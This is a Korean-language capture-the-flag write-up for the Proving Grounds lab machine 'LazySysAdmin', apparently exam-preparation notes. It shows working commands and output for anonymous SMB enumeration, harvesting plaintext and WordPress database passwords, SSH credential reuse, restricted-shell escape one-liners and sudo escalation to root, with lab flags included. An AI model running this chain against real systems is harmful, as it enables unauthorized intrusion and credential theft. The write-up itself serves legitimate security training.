---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/svc/smb
  - tech/cred/reuse
  - tech/lin/rbash-escape
  - tech/lin/sudo-abuse
type: machine
platform: pg
os: linux
ip: 192.168.248.36
domain: admin.local
ports: [22, 80, 139, 445, 3306, 6667]
services: [http, irc, mysql, netbios-ssn, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 4
---
> [!info] PG Practice — LazySysAdmin · Fundamental · Linux (Ubuntu 14.04.5)
> **타겟** 192.168.248.36 · **플래그 2개** — `/home/togie/local.txt` · `/root/proof.txt`
> **경로** SMB 널 세션으로 `share$` (= Apache 웹루트) 열람 → `deets.txt` 에 평문 `12345`, `wp-config.php` 에 `Admin:TogieMYSQL12345^^` → `rpcclient` SID 조회로 사용자명 `togie` 확보 → `ssh togie:12345` → **rbash 감옥** → `bash -c` 로 탈출 → `sudo -l` 이 `(ALL : ALL) ALL` → root
> **핵심** 파일 공유가 웹루트를 그대로 노출하면 설정파일이 곧 자격증명 덤프다. 그리고 **제한 셸은 PATH 를 같이 제한하지 않으면 아무것도 제한하지 못한다.**

> [!warning] 적대적 검증 정정 이력 (2026-08-20)
> 이 노트는 작성자와 분리된 감사를 한 번 통과했다. Kali 산출물(`~/PG/LazySysAdmin/`)·볼트 스크린샷·`nmap-services` 원본과 대조해 아래를 고쳤다. **플래그·해시·IP·자격증명은 한 바이트도 손대지 않았다.**
>
> | 어디 | 무엇이 틀렸나 | 어떻게 고쳤나 |
> |---|---|---|
> | 1장 nmap | "6667 은 top-1000 밖이라 `-p-` 가 아니면 못 본다" | **거짓.** `nmap-services` 개방빈도 순으로 6667/tcp 는 tcp 300위권 = 기본 top-1000 안. 못 본 이유는 예열 스캔이 `--top-ports 200`(`quick.log`)이었기 때문 |
> | 1장 nmap 블록 | `ssh-hostkey`·`irc-info`·host script 결과를 말없이 잘라 연속 출력처럼 보였다 | `nmap.log` 원문으로 복원 |
> | 1장 robots | "앞의 셋은 빈 디렉터리" | `old/`·`test/` 는 빈 디렉터리가 맞고 `TR2/` 는 **웹루트에 존재하지 않는다**(`smb_share_ls.txt`) |
> | 1장 rpcclient | "1000 만 해석됨 = 실제 계정은 togie 하나" | 물어본 범위는 1000~1002 뿐. root 로 본 `/etc/passwd` 로 뒷받침해 다시 씀 |
> | 4장 | "셸을 잡자마자 `harvest.sh` 를 돌렸다"→ 그 SUDO 출력이 막판 판단 근거인 것처럼 서술 | **시간 서사 역전.** 스크립트는 root(16:45:50) 뒤인 16:46·16:48 에 돌았다. 실제 단서는 첫 `id` 의 `27(sudo)`. 산출물 시각표를 넣어 정정 |
> | 4장 SUDO 블록 | `harvest_togie.txt` 의 SUDO 섹션을 `(sudo -n 실패)` 에서 끊어 인용 — 바로 다음 줄부터 `(ALL : ALL) ALL` 이 이미 있다 | 섹션 전문으로 복원 |
> | 4장 `sudo -S -l` 블록 | post-quantum 경고 3행과 배너 첫 행을 잘라냄 | `try_sudo_l.log` 원문으로 복원 |
> | 4장 root 블록 | 명령을 `whoami; id` 로 줄여 적고, 출력은 `...` 뒤에 `proof_root.txt` 앞부분을 붙였다 — 실행된 적 없는 조합 | 실제 명령(타겟 `auth.log` 의 `COMMAND=` 로 교차확인)으로 되돌리고, 출력은 5장 전문을 가리키게 함 |
> | 4장 | "`stdin: is not a tty` 는 `/etc/profile` 계열이 뱉는 잡음" | 근거를 `/root/.profile` 의 `mesg n` 으로 좁히고 `[가정]` 표기 |
> | 5장 플래그 블록 | 배너·post-quantum 경고·`Connection ... closed` 를 잘라 깔끔하게 만듦 | `proof_user.txt`·`proof_root.txt` 전문 복원 |
> | 6장 ③ | "`sudo -n` 은 NOPASSWD 항목만 보여준다" | **틀린 일반 지식.** `-n` 은 프롬프트 금지 플래그라 인증이 필요하면 목록을 거르는 게 아니라 `a password is required` 로 죽는다 |
> | 남긴 흔적 | `auth.log`·`wtmp`·`.bash_history` 를 "확인하지 않았다 `[가정]`" | `traces_confirmed.log` 로 전부 실측 확인됨 — 수치를 넣어 확정으로 승격 |
>
> 감사에서 **반증되어 그대로 둔 것**: `scp -O` 인과(6장 ①, `try9_sftp_rbash.log` + `sshd_config` 의 `Subsystem sftp /usr/lib/openssh/sftp-server` 로 뒷받침), `grep -o` 문맥 요구 오판(6장 ④, `wp_home.html` 실측 56건), pkexec·커널 미시도의 `[가정]` 표기(옳다), 타임존 환산.

## 0. 이 박스에서 배우는 것

- **SMB 널 세션 열람** — 인증 없이 붙는 공유가 하나라도 있으면 `recurse ON; ls` 부터. 여기서는 그 공유가 웹루트였다.
- **평문 자격증명 사냥** — `wp-config.php`·`deets.txt`·`todolist.txt`. 웹루트 파일 목록이 곧 후보 목록이다.
- **사용자명은 추측하지 말고 열거한다** — `rpcclient lookupsids S-1-22-1-<uid>` 로 Unix 계정 이름이 그대로 나온다.
- **rbash 탈출** — `bash`·`sh`·`vi`·`awk` 중 PATH 에 남아 있는 것 하나면 끝난다.
- **`sudo -l` 은 비번을 알면 다시 쳐라** — `sudo -n -l` 만 보고 "sudo 없음"으로 넘기면 여기서 막힌다.

**시험 출제 가능성** — 높다. "널 세션 SMB → 평문 크리덴셜 → 자격증명 재사용 → sudo ALL" 은 OSCP 랩과 시험 리눅스 박스의 기본 골격이다. 변형은 SMB 대신 FTP anonymous, NFS `no_root_squash` 마운트, 또는 백업 `.zip` 노출이다.

## 1. 정찰

### Nmap

```
# Nmap 7.98 scan initiated Thu Aug 20 16:43:25 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.36
Nmap scan report for 192.168.248.36
Host is up (0.084s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)
|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)
|   256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)
|_  256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (ED25519)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-generator: Silex v2.2.7
|_http-title: Backnode
| http-robots.txt: 4 disallowed entries 
|_/old/ /test/ /TR2/ /Backnode_files/
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL (unauthorized)
6667/tcp open  irc         InspIRCd
| irc-info: 
|   server: Admin.local
|   users: 1
|   servers: 1
|   chans: 0
|   lusers: 1
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.45.207
|_  error: Closing link: (nmap@192.168.45.207) [Client exited]
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 4 hops
Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -3h20m00s, deviation: 5h46m24s, median: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-08-20T07:43:55
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: lazysysadmin
|   NetBIOS computer name: LAZYSYSADMIN\x00
|   Domain name: \x00
|   FQDN: lazysysadmin
|_  System time: 2026-08-20T17:43:55+10:00
```

읽어야 할 줄이 셋이다.

`OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8` + `Apache 2.4.7 (Ubuntu)` → **Ubuntu 14.04 trusty**. 두 배너가 독립적으로 같은 릴리스를 가리킨다(14.04 의 apache2 는 2.4.7, openssh 는 6.6.1p1). 셸을 잡은 뒤 `/etc/os-release` 가 `14.04.5 LTS, Trusty Tahr` 로 세 번째 근거를 줬다.

`445 Samba 4.3.11-Ubuntu` → 인증 없이 공유 목록을 물어볼 값이 있다는 뜻. **여기가 실제 진입점이었다.**

`3306 MySQL (unauthorized)` — 포트는 열려 있지만 nmap 이 배너를 못 뽑았다. "unauthorized" 는 서버가 이미 접속 자체를 거부했다는 신호다(뒤에서 확인).

`6667 InspIRCd` 는 먼저 돌린 빠른 스캔(`--top-ports 200`, `quick.log`)에 안 잡혔다. `-p-` 가 뒤늦게 잡아준 포트다. 이 박스에서는 결국 안 썼지만, 못 봤으면 후보 하나를 통째로 잃는 것이다.

> [!warning] "top-1000 밖이라 못 본다"는 틀린 설명이다
> 6667/tcp 는 `/usr/share/nmap/nmap-services` 의 개방빈도 순으로 **tcp 300위권**이라 nmap 기본 `--top-ports 1000` 안에 넉넉히 들어온다. 여기서 놓친 이유는 내가 **top-200 으로 예열 스캔을 돌렸기 때문**이지 포트가 희귀해서가 아니다. 예열 스캔의 범위를 기억해두지 않으면 이런 오귀인이 그대로 굳는다.

### 웹 — 볼 게 없다

![[PG-LazySysAdmin-index.png]]

Silex 로 만든 정적 랜딩 페이지("Welcome, to iDontCare"). `robots.txt` 가 `/old/ /test/ /TR2/ /Backnode_files/` 를 흘리는데, 뒤에 SMB 로 웹루트를 통째로 본 결과 `old/`·`test/` 는 **빈 디렉터리**였고 `TR2/` 는 **웹루트에 아예 없었다**(`Backnode_files/` 는 이 랜딩 페이지의 css·js·이미지). 실제 내용물이 있는 건 `/wordpress/` 뿐이다.

![[PG-LazySysAdmin-wordpress.png]]

첫 포스트 본문이 `My name is togie.` 를 **56번** 반복한다. 사용자명이 웹 화면에 대놓고 적혀 있는 셈인데, 나는 이걸 놓치고 SMB 쪽에서 먼저 찾았다(6장).

### SMB — 널 세션

```
┌──(kali㉿kali)-[~/PG/LazySysAdmin]
└─$ smbclient -L //192.168.248.36 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	share$          Disk      Sumshare
	IPC$            IPC       IPC Service (Web server)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAZYSYSADMIN
```

`-N` 이 널 세션(NULL session, 익명 인증)이다. 이게 통했다는 것 자체가 이미 절반이다.
`IPC$` 의 코멘트가 `IPC Service (Web server)` — Samba 는 `server string` 설정값을 여기 그대로 박는다. 관리자가 이 호스트를 "Web server" 로 부르고 있다는 뜻이고, 공유가 웹루트일 가능성을 미리 시사한다. (root 를 잡은 뒤 `/etc/samba/smb.conf` 에서 `server string = Web server` 로 확인했다.)

`share$` 를 재귀로 훑는다. 셸에서 `$` 는 반드시 이스케이프해야 한다 — 안 하면 빈 문자열로 확장돼 `//타겟/share` 를 찾다가 `NT_STATUS_BAD_NETWORK_NAME` 이 난다.

```
┌──(kali㉿kali)-[~/PG/LazySysAdmin]
└─$ smbclient //192.168.248.36/share\$ -N -c 'recurse ON; ls'
  .                                   D        0  Tue Aug 15 20:05:52 2017
  ..                                  D        0  Mon Aug 14 21:34:47 2017
  wordpress                           D        0  Tue Aug 15 20:21:08 2017
  Backnode_files                      D        0  Mon Aug 14 21:08:26 2017
  wp                                  D        0  Tue Aug 15 19:51:23 2017
  deets.txt                           N      139  Mon Aug 14 21:20:05 2017
  robots.txt                          N       92  Mon Aug 14 21:36:14 2017
  todolist.txt                        N       79  Mon Aug 14 21:39:56 2017
  apache                              D        0  Mon Aug 14 21:35:19 2017
  index.html                          N    36072  Sun Aug  6 14:02:15 2017
  info.php                            N       20  Tue Aug 15 19:55:19 2017
  test                                D        0  Mon Aug 14 21:35:10 2017
  old                                 D        0  Mon Aug 14 21:35:13 2017
```

`index.html`·`robots.txt`·`wordpress/` — **웹루트다.** `robots.txt` 의 항목들이 여기 디렉터리와 1:1로 맞는 것이 결정적 대조다. `-N` 으로 읽히는 공유가 웹루트면 `wp-config.php` 를 그냥 가져갈 수 있다.

나중에 root 로 확인한 `smb.conf` 가 그대로였다:

```
[share$]
   comment = Sumshare
   path = /var/www/html/
   browseable = yes
   read only = yes
   guest ok = yes
```

전역 설정의 `map to guest = bad user` 가 **존재하지 않는 계정으로 온 인증을 게스트로 강등**시킨다. `-N` 이 통한 이유가 이것이다.

### 사용자명 열거 — `rpcclient`

`enum4linux -U` 는 사용자 목록을 못 뽑았다(6장). Unix 계정은 SAM RID 가 아니라 **`S-1-22-1-<uid>`** 네임스페이스에 있고, `rpcclient` 로 SID→이름 역조회를 하면 나온다.

```
┌──(kali㉿kali)-[~/PG/LazySysAdmin]
└─$ for r in 1000 1001 1002; do rpcclient -U '' -N 192.168.248.36 -c "lookupsids S-1-22-1-$r"; done
S-1-22-1-1000 Unix User\togie (1)
S-1-22-1-1001 Unix User\1001 (1)
S-1-22-1-1002 Unix User\1002 (1)
```

**때려본 범위 안에서는** 1000 만 이름으로 해석됐다. 1001·1002 가 숫자 그대로 돌아온 건 "그 uid 에 대응하는 `/etc/passwd` 항목이 없다"는 뜻이다. 일반 사용자 uid 는 1000 부터 매기니 여기서 `togie` 하나로 좁힌 건데, 엄밀히는 1000~1002 만 물어본 결과다 — 뒤에 root 로 `/etc/passwd` 를 봤을 때도 일반 계정은 `togie` 뿐이었다.

> [!tip] Samba 가 뜬 리눅스 박스에서 사용자명을 얻는 순서
> `enum4linux -U` → 빈 결과면 포기하지 말고 `rpcclient -U '' -N <타겟> -c "lookupsids S-1-22-1-1000"`.
> `S-1-22-1-*` = Unix 사용자, `S-1-22-2-*` = Unix 그룹. `S-1-5-21-...-1000` 대역만 뒤지면 로컬 유닉스 계정은 영영 안 나온다.

## 2. 자격증명 수집

세 파일이 전부다.

```
┌──(kali㉿kali)-[~/PG/LazySysAdmin]
└─$ cat deets.txt
CBF Remembering all these passwords.

Remember to remove this file and update your password after we push out the server.

Password 12345
```

```
┌──(kali㉿kali)-[~/PG/LazySysAdmin]
└─$ cat todolist.txt
Prevent users from being able to view to web root using the local file browser
```

`todolist.txt` 는 지금 내가 하고 있는 짓을 관리자가 TODO 로만 적어뒀다는 자백이다. 이런 파일이 나오면 **아직 안 고쳐진 것들의 목록**으로 읽어라.

```
┌──(kali㉿kali)-[~/PG/LazySysAdmin]
└─$ grep -i -E "DB_|table_prefix" wp-config.php
define('DB_NAME', 'wordpress');
define('DB_USER', 'Admin');
define('DB_PASSWORD', 'TogieMYSQL12345^^');
define('DB_HOST', 'localhost');
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');
$table_prefix  = 'wp_';
```

후보 조합이 넷으로 좁혀진다: `togie:12345` · `togie:TogieMYSQL12345^^` · `Admin:TogieMYSQL12345^^` · `root:12345`.
`DB_PASSWORD` 안에 사용자명 `Togie` 가 들어 있는 것이 `deets.txt` 의 `12345` 와 같은 사람의 습관임을 확인해준다 — **`TogieMYSQL12345`** 는 결국 `Togie` + 서비스명 + `12345` 다.

## 3. Foothold — SSH

`togie:12345` 가 첫 시도에 통했다.

```
┌──(kali㉿kali)-[~/PG/LazySysAdmin]
└─$ sshpass -p '12345' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o ConnectTimeout=10 togie@192.168.248.36 'id; hostname; pwd'
Warning: Permanently added '192.168.248.36' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
##################################################################################################
#                                          Welcome to Web_TR1                                    #
#                             All connections are monitored and recorded                         # 
#                    Disconnect IMMEDIATELY if you are not an authorized user!                   # 
##################################################################################################

uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
LazySysAdmin
/home/togie
```

`-o PreferredAuthentications=password` 를 빼면 최신 OpenSSH 클라이언트가 keyboard-interactive/publickey 를 먼저 돌리다 `sshpass` 가 비번을 못 넣고 그대로 실패한다.
`groups` 에 **`27(sudo)`** 가 보인다 — 이 시점에서 권한상승은 사실상 끝났다.

### rbash 감옥

여기서부터가 PG 판의 추가 장치다. `harvest.sh` 를 올려서 돌리려다 걸렸다.

```
┌──(kali㉿kali)-[~/PG/LazySysAdmin]
└─$ sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 'sh /tmp/.h.sh >/dev/null 2>&1; wc -l /tmp/.h/harvest.txt'

rbash: /dev/null: restricted: cannot redirect output
wc: /tmp/.h/harvest.txt: No such file or directory
```

정체를 확인한다.

```
┌──(kali㉿kali)-[~/PG/LazySysAdmin]
└─$ sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 'echo SHELL=$SHELL; echo 0=$0; echo PATH=$PATH; grep togie /etc/passwd; ls -la /tmp/.h.sh; echo TEST; echo hi > /tmp/zz'
SHELL=/bin/rbash
0=rbash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
togie:x:1000:1000:togie,,,:/home/togie:/bin/rbash
-rwxrwxr-x 1 togie togie 2711 Aug 20 17:44 /tmp/.h.sh
TEST
rbash: /tmp/zz: restricted: cannot redirect output
```

`/etc/passwd` 의 셸이 `/bin/rbash` 다. 실제로 뭐가 막히는지 하나씩 때려봤다.

```
┌──(kali㉿kali)-[~/PG/LazySysAdmin]
└─$ sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 'cd /tmp; /bin/ls /home; PATH=/tmp; export -f x'
#                    Disconnect IMMEDIATELY if you are not an authorized user!                   # 
##################################################################################################

rbash: line 0: cd: restricted
rbash: /bin/ls: restricted: cannot specify `/' in command names
rbash: PATH: readonly variable
```

> [!note] rbash 가 실제로 막는 것
> `cd` · 명령 이름에 `/` 포함 · `>`/`>>` 리다이렉션 · `PATH`·`SHELL`·`ENV`·`BASH_ENV` 대입 · `hash -p` · `enable`/`command` 로 빌트인 우회 · `-r` 해제.
> **막지 않는 것: PATH 에 이미 있는 실행파일을 이름만으로 부르는 것.** 그래서 탈출은 "무엇이 PATH 에 남아 있는가" 문제로 환원된다.

여기 PATH 는 `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games` — **평범한 기본 PATH 를 그대로 두었다.** 제대로 된 rbash 감옥은 PATH 를 `~/bin` 같은 화이트리스트 디렉터리 하나로 좁히고 거기에 심볼릭 링크를 몇 개만 둔다. 그게 없으니 `/bin/bash` 가 `bash` 라는 이름만으로 그대로 손에 잡힌다.

```
┌──(kali㉿kali)-[~/PG/LazySysAdmin]
└─$ sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 "bash -c 'echo esc > /tmp/zz; cat /tmp/zz; id; ls -la /home/togie'"
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
##################################################################################################
#                                          Welcome to Web_TR1                                    #
#                             All connections are monitored and recorded                         # 
#                    Disconnect IMMEDIATELY if you are not an authorized user!                   # 
##################################################################################################

esc
uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
total 28
drwxr-xr-x 3 togie togie 4096 Jul  9  2020 .
drwxr-xr-x 3 root  root  4096 Aug 14  2017 ..
-rw------- 1 togie togie    0 Mar  5  2020 .bash_history
-rw-r--r-- 1 togie togie  220 Aug 14  2017 .bashrc
drwx------ 2 togie togie 4096 Aug 14  2017 .cache
-rw-r--r-- 1 togie togie   33 Aug 20 17:40 local.txt
-rw-r--r-- 1 togie togie  675 Aug 14  2017 .profile
```

리다이렉션이 살아났고 `local.txt` 가 보인다. `bash -c` 가 통하는 이유는 단순하다 — rbash 는 **자기 프로세스의 동작만** 제한한다. 자식으로 뜬 `bash` 는 `-r` 없이 시작하므로 평범한 셸이다.

> [!tip] 제한 셸을 만나면 순서대로 때린다
> 1. `echo $PATH` · `ls $(echo $PATH | tr : ' ')` — 뭐가 남아 있는지가 전부다
> 2. `bash` / `sh` / `python3 -c 'import os;os.system("/bin/bash")'`
> 3. `vi` → `:set shell=/bin/bash` → `:shell`, `awk 'BEGIN{system("/bin/bash")}'`, `find . -exec /bin/bash \;`
> 4. 원격이면 셸을 아예 안 거치는 방법 — `ssh user@host -t "bash --noprofile"`, 또는 `ssh user@host` 대신 `ssh -o RemoteCommand=bash`
>
> 대상이 SSH 라면 3번까지 갈 것도 없이 **명령 인자로 `bash -c` 를 던지는 것**이 제일 빠르다.

## 4. 권한상승

순서를 산출물 시각(Kali 로컬, KST) 그대로 적는다. 이 절의 교훈이 **어디서 나왔는지**가 자칫 뒤집혀 기억되기 때문이다.

| 시각 | 산출물 | 무슨 일 |
|---|---|---|
| 16:44:27 | `try1_ssh_togie_12345.log` | 첫 SSH. `id` 에 `27(sudo)` |
| 16:45:40 | `try_sudo_l.log` | `echo 12345 \| sudo -S -l` → `(ALL : ALL) ALL` |
| 16:45:50 | `proof_root.txt` | root |
| 16:46:02 | `harvest_root.txt` | 열거 스크립트(root) |
| 16:48:23 | `harvest_togie.txt` | 열거 스크립트(togie) |

즉 권한상승의 단서는 열거 스크립트가 아니라 **첫 `id` 한 줄**이었다. `harvest.sh` 는 root 를 잡은 뒤에야 돌았고(`bash /tmp/.h.sh` — rbash 로는 못 돌린다), 아래 출력은 사후에 "다른 경로는 없었나"를 확인한 것이다.

```
===== OS =====
Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 athlon i686 GNU/Linux
NAME="Ubuntu"
VERSION="14.04.5 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.5 LTS"
VERSION_ID="14.04"
```

SUDO 섹션은 **자르지 않고** 옮긴다. 앞의 두 줄만 떼어 보이면 이 절의 교훈이 어디서 나왔는지가 왜곡된다.

```
===== SUDO =====
sudo: a password is required
(sudo -n 실패 — 비밀번호 필요하거나 sudo 없음)
-- sudo -S -l (HARVEST_PW) --
[sudo] password for togie: Matching Defaults entries for togie on LazySysAdmin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL
```

앞의 두 줄이 `sudo -n -l` 결과, `--` 아래가 비번을 넣어 다시 친 결과다. **뒤 절반은 원래 `harvest.sh` 에 없었다** — 이 박스에서 데고 나서 붙인 것이라 16:48 실행분에는 이미 들어 있다. 정확한 추가 시각을 기록해두지 않아 `[가정]` 이다. 어쨌든 스크립트가 앞의 두 줄에서 끝나던 시점에 그것만 봤다면 "sudo 경로 없음"으로 읽힌다.

**`sudo -n` 은 "비번 없이 되는가"만 묻는다.** `id` 가 이미 `27(sudo)` 를 보여줬고 비번(`12345`)도 손에 있으니 다시 친다.

```
┌──(kali㉿kali)-[~/PG/LazySysAdmin]
└─$ sshpass -p '12345' ssh -o StrictHostKeyChecking=no togie@192.168.248.36 "bash -c 'echo 12345 | sudo -S -l'"
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
##################################################################################################
#                                          Welcome to Web_TR1                                    #
#                             All connections are monitored and recorded                         # 
#                    Disconnect IMMEDIATELY if you are not an authorized user!                   # 
##################################################################################################

[sudo] password for togie: Matching Defaults entries for togie on LazySysAdmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL
```

`(ALL : ALL) ALL` — 어떤 사용자로든, 어떤 그룹으로든, 아무 명령이나. 끝났다.

`-S` 는 비번을 stdin 에서 읽는 플래그다. 이게 없으면 sudo 가 **tty 를 직접 열어** 프롬프트를 띄우므로 파이프로 넣은 비번이 무시되고 비대화형 배치가 그대로 멎는다.

그대로 root 를 잡았다. 실제로 던진 것은 아래 한 줄이고, 출력 전문은 5장의 `proof_root.txt` 블록이다 — 같은 실행에서 root 확인과 플래그 읽기를 함께 했기 때문에 여기서 따로 옮기지 않는다.

```
┌──(kali㉿kali)-[~/PG/LazySysAdmin]
└─$ sshpass -p '12345' ssh -tt -o StrictHostKeyChecking=no togie@192.168.248.36 "bash -c 'echo 12345 | sudo -S -i bash -c \"whoami; id; hostname; hostname -I; date; ls -la /root; cat /root/proof.txt\"'"
```

`sudo -i` 를 쓴 흔적은 타겟 `auth.log` 에도 그대로 남는다 — `COMMAND=/bin/bash -c bash -c whoami; id; ...` 로 기록됐다(`traces_confirmed.log`). `sudo -i <명령>` 은 root 의 로그인 셸을 `-c` 로 불러 명령을 넘기므로 `COMMAND` 에 셸이 먼저 찍힌다.

출력 첫 줄의 `stdin: is not a tty` 는 그 로그인 셸이 읽는 `/root/.profile` 의 `mesg n` 이 tty 없는 stdin 을 만나 뱉는 잡음이다(`[가정]` — 14.04 기본 `.profile` 이 140바이트 그대로인 것까지만 확인했다). 그 다음 줄에서 `uid=0` 이 나왔으니 실패가 아니다.

### 다른 경로는 없었나

`harvest.sh` 의 나머지를 검토한 결과는 이렇다.

`SUID` 목록은 14.04 기본값 그대로였다 — `/bin/ping`·`/bin/su`·`/usr/bin/passwd`·`/usr/bin/chsh`·`/usr/bin/pkexec`·`/usr/bin/at`·`/usr/bin/mtr` 등. 커스텀 SUID 바이너리는 **하나도 없다**. `CAPS` 섹션(`getcap -r /`)도 비어 있었고, `/etc/cron.d`·`cron.daily` 도 배포판 기본 + `php5` 세션 정리 뿐이었다.

`/usr/bin/pkexec` 가 SUID 로 있으니 PwnKit(CVE-2021-4034)이 이론상 후보지만, sudo 로 이미 root 였으므로 **시도하지 않았다.** 이 박스에서 취약 여부를 확인한 적이 없다 — `[가정]` 이다.

커널 `4.4.0-31-generic` / Ubuntu 14.04 도 공개 로컬 익스플로잇이 여럿 있는 조합이지만 같은 이유로 손대지 않았다. **커널 익스플로잇은 항상 마지막 후보다** — 박스를 죽일 수 있고, 시험에서는 리버트 비용이 그대로 시간이다.

## 5. 플래그

두 값 모두 **SSH 대화형 셸에서 원위치 `cat`** 으로 읽었다. 웹셸을 만들지 않았다.
2026-08-20 인스턴스 값이다 — PG 는 박스를 다시 켤 때마다 새로 생성한다.

`/home/togie/local.txt` (`proof_user.txt` 전문 — 배너와 클라이언트 경고를 포함해 자르지 않았다):

```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
##################################################################################################
#                                          Welcome to Web_TR1                                    #
#                             All connections are monitored and recorded                         # 
#                    Disconnect IMMEDIATELY if you are not an authorized user!                   # 
##################################################################################################

togie
uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
LazySysAdmin
192.168.248.36 
Thu Aug 20 17:45:25 AEST 2026
3170c6b1e7bac5a3dc430b899115d3b4
Connection to 192.168.248.36 closed.
```

`/root/proof.txt` (`proof_root.txt` 전문):

```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
##################################################################################################
#                                          Welcome to Web_TR1                                    #
#                             All connections are monitored and recorded                         # 
#                    Disconnect IMMEDIATELY if you are not an authorized user!                   # 
##################################################################################################

[sudo] password for togie: stdin: is not a tty
root
uid=0(root) gid=0(root) groups=0(root)
LazySysAdmin
192.168.248.36 
Thu Aug 20 17:45:50 AEST 2026
total 24
drwx------  3 root root 4096 Aug 20 17:39 .
drwxr-xr-x 22 root root 4096 Feb 20  2020 ..
-rw-------  1 root root    0 Jul  9  2020 .bash_history
-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
drwx------  2 root root 4096 Aug 14  2017 .cache
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-r--r--  1 root root   33 Aug 20 17:39 proof.txt
09675eaefc242e881bcf18f83c340e90
Connection to 192.168.248.36 closed.
```

두 블록 다 `[sudo] password for togie:` 와 SSH 배너가 그대로 붙어 있다. 지저분해 보여도 **이게 실측의 표식**이라 손대지 않았다. 규정상으로도 문제가 없다 — 이건 웹셸이 아니라 SSH 세션이고, `-tt` 로 tty 를 붙여 원위치에서 `cat` 했다.

타겟은 AEST(+1000), Kali 는 KST(+0900)다. Kali 산출물 mtime 16:45 = 타겟 `date` 17:45 로 정확히 맞는다. nmap 도 `clock-skew ... median: -1s` 로 시계 자체는 동기돼 있다고, `smb-os-discovery` 는 `System time: 2026-08-20T17:43:55+10:00` 으로 타겟 타임존이 +1000 임을 각각 독립 기록했다.

## 6. 막혔던 지점 / 시행착오

전체 소요는 정찰 시작(Kali 16:43:25)부터 root(16:45:50)까지 2분 25초다. 그래도 헛다리는 여덟 개 나왔고, 그중 절반은 **도구 사용법 문제**였지 박스 문제가 아니었다.

